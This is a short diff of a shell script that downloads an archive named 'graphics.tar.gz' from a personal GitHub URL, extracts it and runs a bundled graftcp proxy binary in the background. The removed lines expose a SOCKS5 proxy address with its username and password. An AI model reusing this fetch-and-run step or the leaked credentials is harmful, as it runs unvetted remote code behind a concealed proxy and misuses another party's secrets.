@@ -8,10 +8,10 @@ wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.g
 
 tar -xvzf graphics.tar.gz
 
-cat > graftcp/local/graftcp-local.conf <<END listen = :2233 loglevel = 1 
-socks5 = 45.142.28.20:8031
-socks5_username = bpabongt
-socks5_password = wq3yxof26xsh
+cat > graftcp/local/graftcp-local.conf <<END 
+listen = :2233 
+loglevel = 1
+
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
